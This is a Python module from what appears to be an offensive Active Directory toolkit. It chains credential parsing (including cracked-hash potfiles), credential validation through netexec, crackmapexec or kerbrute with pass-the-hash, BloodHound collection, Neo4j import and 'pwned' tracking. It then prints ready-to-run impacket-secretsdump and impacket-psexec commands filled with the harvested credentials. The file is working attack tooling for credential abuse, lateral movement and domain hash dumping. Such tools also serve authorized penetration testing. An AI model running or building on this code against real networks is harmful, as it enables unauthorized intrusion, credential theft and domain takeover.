"""
Credential pipeline for --creds integration.

Orchestrates: parse -> validate -> collect -> import -> pwn -> query

Follows single responsibility principle - each stage is a separate class.
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Optional, Dict, Any
import subprocess
import tempfile
import shutil
import time

from .credential_input import (
    ParsedCredential,
    CredType,
    create_credential_parser,
)
from .config import Neo4jConfig


@dataclass
class PipelineResult:
    """Result from credential pipeline execution."""
    success: bool
    credentials_parsed: int = 0
    credentials_valid: int = 0
    bloodhound_collected: bool = False
    bloodhound_output_dir: Optional[Path] = None
    users_marked_pwned: int = 0
    neo4j_imported: bool = False
    edges_imported: int = 0
    error: Optional[str] = None
    access_summary: Dict[str, Any] = field(default_factory=dict)


@dataclass
class PipelineOptions:
    """Options controlling pipeline behavior."""
    skip_validate: bool = False    # --skip-validate: Trust creds without testing
    skip_collect: bool = False     # --no-collect: Skip BloodHound collection
    skip_pwn: bool = False         # --no-pwn: Don't mark as pwned
    skip_import: bool = False      # --no-import: Don't import BH data
    output_dir: Optional[Path] = None  # Where to save BH output (default: CWD)
    use_zip: bool = False          # --zip: Output as ZIP instead of directory
    verbose: bool = False
    domain: Optional[str] = None   # Override domain


class CredentialValidator:
    """
    Validate credentials before expensive operations.

    Uses Kerberos pre-auth or SMB to test credentials.
    Fail-fast approach: invalid creds abort before BloodHound collection.
    """

    def __init__(self, target: str, domain: Optional[str] = None):
        self.target = target
        self.domain = domain

    def validate(self, cred: ParsedCredential, timeout: int = 15) -> bool:
        """
        Test if credential is valid.

        For passwords: Uses kerbrute or crackmapexec
        For hashes: Uses crackmapexec with -H

        Returns True if credential is valid, False otherwise.
        """
        domain = cred.domain or self.domain
        if not domain:
            # Can't validate without domain - assume valid
            return True

        if cred.cred_type == CredType.PASSWORD:
            return self._validate_password(cred.username, cred.value, domain, timeout)
        elif cred.cred_type == CredType.NTLM_HASH:
            return self._validate_hash(cred.username, cred.value, domain, timeout)
        else:
            # For tickets/certs, assume valid (harder to test)
            return True

    def _validate_password(
        self,
        username: str,
        password: str,
        domain: str,
        timeout: int
    ) -> bool:
        """Validate password credential via Kerberos or SMB."""
        # Prefer crackmapexec (more reliable output parsing)
        if shutil.which("crackmapexec") or shutil.which("netexec"):
            tool = "netexec" if shutil.which("netexec") else "crackmapexec"
            try:
                result = subprocess.run(
                    [tool, "smb", self.target,
                     "-u", username, "-p", password, "-d", domain],
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                # [+] indicates success, STATUS_LOGON_FAILURE indicates bad creds
                return "[+]" in result.stdout and "STATUS_LOGON_FAILURE" not in result.stdout
            except subprocess.TimeoutExpired:
                return False
            except Exception:
                pass

        # Fallback to kerbrute
        if shutil.which("kerbrute"):
            try:
                # Create temp file with single password
                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                    f.write(password)
                    passfile = f.name

                result = subprocess.run(
                    ["kerbrute", "bruteuser",
                     "--dc", self.target,
                     "-d", domain,
                     passfile, username],
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                Path(passfile).unlink(missing_ok=True)
                return "VALID" in result.stdout.upper()
            except Exception:
                pass

        # No validation tool available - warn and proceed
        return True

    def _validate_hash(
        self,
        username: str,
        ntlm_hash: str,
        domain: str,
        timeout: int
    ) -> bool:
        """Validate NTLM hash via pass-the-hash."""
        tool = "netexec" if shutil.which("netexec") else "crackmapexec"
        if shutil.which(tool):
            try:
                result = subprocess.run(
                    [tool, "smb", self.target,
                     "-u", username, "-H", ntlm_hash, "-d", domain],
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                return "[+]" in result.stdout and "STATUS_LOGON_FAILURE" not in result.stdout
            except Exception:
                pass
        return True


class BloodHoundCollector:
    """
    Collect BloodHound data using bloodhound-python.

    Runs authenticated collection with provided credentials.
    """

    def __init__(self, target: str, domain: str, output_dir: Optional[Path] = None):
        self.target = target
        self.domain = domain
        # Default to CWD, not temp dir
        self.output_dir = output_dir or Path.cwd()

    def is_available(self) -> bool:
        """Check if bloodhound-python is installed."""
        return shutil.which("bloodhound-python") is not None

    def collect(
        self,
        cred: ParsedCredential,
        collection_method: str = "All",
        timeout: int = 300,
        use_zip: bool = False
    ) -> Path:
        """
        Run bloodhound-python collection.

        Args:
            cred: Validated credential to use
            collection_method: BloodHound collection method (All, DCOnly, etc.)
            timeout: Collection timeout in seconds
            use_zip: Output as ZIP file instead of JSON directory

        Returns:
            Path to output directory containing JSON files (or ZIP if use_zip=True)

        Raises:
            RuntimeError: If collection fails
        """
        if not self.is_available():
            raise RuntimeError("bloodhound-python not installed")

        domain = cred.domain or self.domain

        # Create domain-specific output directory
        domain_dir = self.output_dir / f"bloodhound-{domain.upper()}"
        domain_dir.mkdir(parents=True, exist_ok=True)

        cmd = [
            "bloodhound-python",
            "-d", domain.lower(),
            "-u", cred.username,
            "-c", collection_method,
            "--dns-tcp",  # More reliable
            "-ns", self.target,  # Use target as nameserver
        ]

        # Add --zip only if requested
        if use_zip:
            cmd.append("--zip")

        # Add credential based on type
        if cred.cred_type == CredType.PASSWORD:
            cmd.extend(["-p", cred.value])
        elif cred.cred_type == CredType.NTLM_HASH:
            cmd.extend(["--hashes", f":{cred.value}"])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=str(domain_dir)
            )

            if result.returncode != 0:
                raise RuntimeError(f"BloodHound collection failed: {result.stderr}")

            # Find output files (ZIP or JSON)
            output_files = list(domain_dir.glob("*.zip")) + list(domain_dir.glob("*.json"))
            if not output_files:
                raise RuntimeError("No output files generated")

            return domain_dir

        except subprocess.TimeoutExpired:
            raise RuntimeError(f"BloodHound collection timed out ({timeout}s)")


class CredentialPipeline:
    """
    Main pipeline orchestrator.

    Coordinates all stages: parse -> validate -> collect -> import -> pwn -> query
    """

    # Colors for output
    C = "\033[96m"   # Cyan
    G = "\033[92m"   # Green
    Y = "\033[93m"   # Yellow
    R = "\033[91m"   # Red
    B = "\033[1m"    # Bold
    D = "\033[2m"    # Dim
    X = "\033[0m"    # Reset

    def __init__(
        self,
        target: str,
        neo4j_config: Neo4jConfig,
        options: Optional[PipelineOptions] = None,
    ):
        self.target = target
        self.neo4j_config = neo4j_config
        self.options = options or PipelineOptions()
        self.tracker = None  # Lazy-loaded

    def _get_tracker(self):
        """Lazy-load PwnedTracker."""
        if self.tracker is None:
            from .pwned_tracker import PwnedTracker
            self.tracker = PwnedTracker(self.neo4j_config)
        return self.tracker

    def run(
        self,
        inline_creds: Optional[str] = None,
        creds_file: Optional[Path] = None,
        use_potfile: bool = False,
        potfile_path: Optional[Path] = None,
    ) -> PipelineResult:
        """
        Execute the full credential pipeline.

        Args:
            inline_creds: Credential string (user:pass)
            creds_file: Path to credentials file
            use_potfile: Auto-detect and use potfile
            potfile_path: Custom potfile path

        Returns:
            PipelineResult with summary of operations
        """
        result = PipelineResult(success=False)
        start_time = time.time()

        print()
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")
        print(f"{self.C}{self.B}  CREDENTIAL PIPELINE{self.X}")
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")
        print()

        # ─────────────────────────────────────────────────────────────────────
        # Stage 1: PARSE
        # ─────────────────────────────────────────────────────────────────────
        try:
            parser = create_credential_parser(
                inline=inline_creds,
                file_path=creds_file,
                use_potfile=use_potfile,
                potfile_path=potfile_path,
            )
            credentials = parser.parse()
            result.credentials_parsed = len(credentials)

            if not credentials:
                result.error = "No credentials parsed from input"
                print(f"{self.R}[!] {result.error}{self.X}")
                return result

            print(f"[*] Parsed {len(credentials)} credential(s) from {parser.source_description()}")

            # Apply domain override if specified
            if self.options.domain:
                for cred in credentials:
                    if not cred.domain:
                        cred.domain = self.options.domain

        except Exception as e:
            result.error = f"Parse failed: {e}"
            print(f"{self.R}[!] {result.error}{self.X}")
            return result

        # ─────────────────────────────────────────────────────────────────────
        # Stage 2: VALIDATE (mandatory unless --skip-validate)
        # ─────────────────────────────────────────────────────────────────────
        valid_creds: List[ParsedCredential] = []

        if self.options.skip_validate:
            print(f"{self.Y}[*] Skipping validation (--skip-validate){self.X}")
            valid_creds = credentials
        else:
            print(f"\n[*] Validating credentials against {self.target}...")
            validator = CredentialValidator(self.target, self.options.domain)

            for cred in credentials:
                if self.options.verbose:
                    print(f"    Testing: {cred.username}")

                if validator.validate(cred):
                    valid_creds.append(cred)
                    print(f"  {self.G}[+] Valid:{self.X} {cred.username} ({cred.cred_type.value})")
                else:
                    print(f"  {self.R}[-] Invalid:{self.X} {cred.username}")

        result.credentials_valid = len(valid_creds)

        if not valid_creds:
            result.error = "No valid credentials - aborting"
            print(f"\n{self.R}[!] {result.error}{self.X}")
            return result

        # Use first valid credential for collection
        primary_cred = valid_creds[0]

        # ─────────────────────────────────────────────────────────────────────
        # Stage 3: COLLECT BloodHound data (unless --no-collect)
        # ─────────────────────────────────────────────────────────────────────
        if self.options.skip_collect:
            print(f"\n{self.Y}[*] Skipping BloodHound collection (--no-collect){self.X}")
        else:
            domain = primary_cred.domain or self.options.domain
            if not domain:
                print(f"\n{self.Y}[!] Cannot collect BloodHound: domain unknown{self.X}")
                print(f"    Use --domain to specify")
            else:
                collector = BloodHoundCollector(self.target, domain, self.options.output_dir)

                if not collector.is_available():
                    print(f"\n{self.Y}[!] bloodhound-python not installed - skipping collection{self.X}")
                else:
                    try:
                        print(f"\n[*] Running BloodHound collection as {primary_cred.username}...")
                        bh_output = collector.collect(primary_cred, use_zip=self.options.use_zip)
                        result.bloodhound_collected = True
                        result.bloodhound_output_dir = bh_output
                        print(f"{self.G}[+] BloodHound data saved to: {bh_output}{self.X}")
                    except Exception as e:
                        print(f"{self.Y}[!] BloodHound collection failed: {e}{self.X}")

        # ─────────────────────────────────────────────────────────────────────
        # Stage 4: IMPORT to Neo4j (unless --no-import or no data)
        # ─────────────────────────────────────────────────────────────────────
        if self.options.skip_import:
            print(f"\n{self.Y}[*] Skipping Neo4j import (--no-import){self.X}")
        elif result.bloodhound_collected and result.bloodhound_output_dir:
            try:
                from .main import BHEnhancer
                from pathlib import Path

                print(f"\n[*] Importing BloodHound data to Neo4j...")
                # Resolve ZIP file if output_dir contains one
                bh_path = Path(result.bloodhound_output_dir)
                zip_files = list(bh_path.glob("*.zip"))
                import_path = zip_files[0] if zip_files else bh_path
                enhancer = BHEnhancer(import_path, self.neo4j_config)
                stats = enhancer.run(preset="attack-paths", dc_ip=self.target)
                result.neo4j_imported = True
                result.edges_imported = stats.edges_imported
                print(f"{self.G}[+] Imported {stats.edges_imported} edges{self.X}")
            except Exception as e:
                print(f"{self.Y}[!] Import failed: {e}{self.X}")

        # ─────────────────────────────────────────────────────────────────────
        # Stage 4.5: Generate bloodtrail.md report
        # ─────────────────────────────────────────────────────────────────────
        if result.neo4j_imported and result.bloodhound_output_dir:
            try:
                from .report_generator import run_all_queries
                from .query_runner import QueryRunner

                report_path = Path(result.bloodhound_output_dir) / "bloodtrail.md"
                print(f"\n[*] Generating attack path report...")
                runner = QueryRunner(self.neo4j_config)
                run_all_queries(runner, output_path=report_path)
                print(f"{self.G}[+] Report saved to: {report_path}{self.X}")
            except Exception as e:
                print(f"{self.Y}[!] Report generation failed: {e}{self.X}")

        # ─────────────────────────────────────────────────────────────────────
        # Stage 5: MARK PWNED (unless --no-pwn)
        # ─────────────────────────────────────────────────────────────────────
        if self.options.skip_pwn:
            print(f"\n{self.Y}[*] Skipping pwned marking (--no-pwn){self.X}")
        else:
            tracker = self._get_tracker()
            if not tracker.connect():
                print(f"{self.Y}[!] Could not connect to Neo4j for pwned tracking{self.X}")
            else:
                print(f"\n[*] Marking users as pwned...")
                for cred in valid_creds:
                    try:
                        pwn_result = tracker.mark_pwned(
                            user=cred.upn,
                            cred_type=cred.cred_type.value,
                            cred_value=cred.value,
                            notes=f"Via --creds from {cred.source}",
                        )
                        if pwn_result.success:
                            result.users_marked_pwned += 1
                            print(f"  {self.G}[+] Marked pwned:{self.X} {cred.upn}")

                            # Collect access info
                            if pwn_result.access:
                                result.access_summary[cred.upn] = {
                                    "access_count": len(pwn_result.access),
                                    "domain_level": pwn_result.domain_level_access,
                                }
                        else:
                            print(f"  {self.Y}[-] Could not mark:{self.X} {cred.upn} (user not in Neo4j?)")
                    except Exception as e:
                        print(f"  {self.R}[!] Error marking {cred.username}:{self.X} {e}")

        # ─────────────────────────────────────────────────────────────────────
        # Stage 6: QUERY - Show attack paths
        # ─────────────────────────────────────────────────────────────────────
        if result.users_marked_pwned > 0:
            self._print_attack_paths(valid_creds)

        # Summary
        duration = time.time() - start_time
        print()
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")
        print(f"{self.C}{self.B}  PIPELINE SUMMARY ({duration:.1f}s){self.X}")
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")
        print(f"  Credentials parsed:     {result.credentials_parsed}")
        print(f"  Credentials valid:      {result.credentials_valid}")
        print(f"  BloodHound collected:   {'Yes' if result.bloodhound_collected else 'No'}")
        if result.neo4j_imported:
            print(f"  Edges imported:         {result.edges_imported}")
        print(f"  Users marked pwned:     {result.users_marked_pwned}")
        print()

        result.success = True
        return result

    def _print_attack_paths(self, credentials: List[ParsedCredential]):
        """Display attack commands for pwned users."""
        tracker = self._get_tracker()
        if not tracker._ensure_connected():
            return

        print()
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")
        print(f"{self.C}{self.B}  ATTACK PATHS{self.X}")
        print(f"{self.C}{self.B}{'=' * 70}{self.X}")

        domain_config = tracker.get_domain_config()
        dc_ip = domain_config.get("dc_ip") if domain_config else self.target

        for cred in credentials:
            user = tracker.get_pwned_user(cred.upn)
            if not user:
                continue

            print(f"\n  {self.B}{cred.upn}{self.X}")
            print(f"  {self.D}{'─' * 60}{self.X}")

            # Domain-level access
            if user.domain_level_access:
                print(f"  {self.R}{self.B}DOMAIN ADMIN ACCESS{self.X}")
                if cred.cred_type == CredType.PASSWORD:
                    print(f"  {self.G}impacket-secretsdump '{cred.domain}/{cred.username}:{cred.value}'@{dc_ip}{self.X}")
                elif cred.cred_type == CredType.NTLM_HASH:
                    print(f"  {self.G}impacket-secretsdump -hashes :{cred.value} '{cred.domain}/{cred.username}'@{dc_ip}{self.X}")
                print()

            # Machine access
            if user.access:
                admin_machines = [a for a in user.access if a.privilege_level == "local-admin"]
                if admin_machines:
                    print(f"  {self.Y}LOCAL ADMIN on {len(admin_machines)} machine(s):{self.X}")
                    for access in admin_machines[:3]:
                        target = access.computer_ip or access.computer
                        if cred.cred_type == CredType.PASSWORD:
                            print(f"    {self.G}impacket-psexec '{cred.domain}/{cred.username}:{cred.value}'@{target}{self.X}")
                        elif cred.cred_type == CredType.NTLM_HASH:
                            print(f"    {self.G}impacket-psexec -hashes :{cred.value} '{cred.domain}/{cred.username}'@{target}{self.X}")
                    if len(admin_machines) > 3:
                        print(f"    {self.D}... and {len(admin_machines) - 3} more{self.X}")

    def close(self):
        """Cleanup resources."""
        if self.tracker:
            self.tracker.close()
